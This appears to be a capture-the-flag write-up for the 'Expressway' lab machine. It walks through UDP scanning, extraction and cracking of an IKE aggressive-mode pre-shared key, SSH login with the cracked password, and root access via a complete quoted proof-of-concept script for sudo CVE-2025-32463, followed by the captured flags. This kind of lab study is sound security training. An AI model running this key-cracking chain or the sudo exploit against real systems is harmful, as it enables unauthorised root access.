# Expressway

<p>IP address: 10.10.11.87</p>
<p>OS: Linux</p>

## Nmap

### TCP Scan

```bash
└─$ nmap -sT -sV -sC -p- 10.10.11.87 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 05:20 EDT
Nmap scan report for 10.10.11.87
Host is up (0.028s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds

```

- TCP connect() scan revealed the results above.
- No known exploits for OpenSSH 10.0p2 that would grant us entry.

### UDP scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sU -p 1-500 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 06:51 EDT
Nmap scan report for 10.10.11.87
Host is up (0.020s latency).
Not shown: 497 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
69/udp  open|filtered tftp
500/udp open          isakmp

Nmap done: 1 IP address (1 host up) scanned in 502.66 seconds
```

- IPSec/IKE running on port 500/udp
- Likely used for VPN negotiations
- Weak configurations (like using aggressive mode with pre-shared keys) can be brute-forced or enumerated

## Port 500/UDP (isakmp)

### ike-scan

```bash
┌──(kali㉿kali)-[~]
└─$ ike-scan -M -A 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=3e5d90abce4b0a75)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.034 seconds (29.44 hosts/sec).  1 returned handshake; 0 returned notify
```

- Host is configured to answer aggressive-mode queries.
- Identity: `ike@expressway.htb`

```bash
┌──(kali㉿kali)-[~]
└─$ ike-scan -A --pskcrack 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=09c6cbee0232f526) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
319024f3e192a6f8c2892a1292ffcc8217ca53d0f0ce3566d277d72a6db4acc90b12a0e8fbf8e1ae460ad76b4574bc6ea6f69cdf2d6362852fdf614365a4506814e8ab97d122a91ec7912a41f82845137100b448bbcbef5c2b1cf5b0c6d8b8c717be8f39a3ca39ef906fa0daa868acd90669c1e4325a43ee3b23c75ba74966d0:227390cd8d912dc1ccf15be1c8fff069522d740be5e38f53aa7eecc73fbd411fb7d639330174b6919a93c12af25604b405c68c9a6f41154f0f43d60d0d17b91f64e7cb5a0733a64a72af6536197837fdf70639116b299ae536594bf5e20786c70066d9f6e7dad0d40b91f65cc83397ce9a90134f16d514dc0e3546fa7b6fcd98:09c6cbee0232f526:7bbff98a26469887:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:54d7eac322d2c34fdd61d60c99e0bfd5665679e3:133dfca1e66efa4827fe5142c68910ec6d0c6177b25a6e7b8e57f1b0547ee873:204f09c8bd880eab6e9ab0b657e721c551ff2ba8
Ending ike-scan 1.9.6: 1 hosts scanned in 0.025 seconds (40.09 hosts/sec).  1 returned handshake; 0 returned notify
```

- PSK hash: `204f09c8bd880eab6e9ab0b657e721c551ff2ba8`

### psk-crack

```bash
┌──(kali㉿kali)-[~]
└─$ sudo psk-crack -d /usr/share/wordlists/rockyou.txt psk2.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 204f09c8bd880eab6e9ab0b657e721c551ff2ba8
Ending psk-crack: 8045040 iterations in 4.801 seconds (1675601.43 iterations/sec)
```

- Username: `ike`
- Password: `freakingrockstarontheroad`

## Initial Access

```bash
┌──(kali㉿kali)-[~]
└─$ ssh ike@10.10.11.87                                        
The authenticity of host '10.10.11.87 (10.10.11.87)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.87' (ED25519) to the list of known hosts.
ike@10.10.11.87's password: 
Last login: Fri Oct  3 17:52:33 BST 2025 from 10.10.16.66 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Oct 3 18:13:05 2025 from 10.10.16.27
ike@expressway:~$ 
```

- Authenticated to the host via SSH using the recovered credentials.

### User Flag

```bash
ike@expressway:~$ cat user.txt
3e601255473ce6e5c669222873bb98b7
```

- User flag: `3e601255473ce6e5c669222873bb98b7`

## Privilege Escalation

### Sudo

```bash
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

- Sudo v1.9.17 is vulnerable (CVE-2025-32463)

```bash
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

- Found the exploit above on GitHub, which I used to gain root privileges

```bash
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ chmod +x exploit.sh
ike@expressway:~$ ./exploit.sh 
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

### Root Flag

```bash
root@expressway:/# cd root
root@expressway:/root# ls
root.txt
root@expressway:/root# cat root.txt
1a318496a81cc87d3a87905079c65ff1
```

- Root flag: `1a318496a81cc87d3a87905079c65ff1`
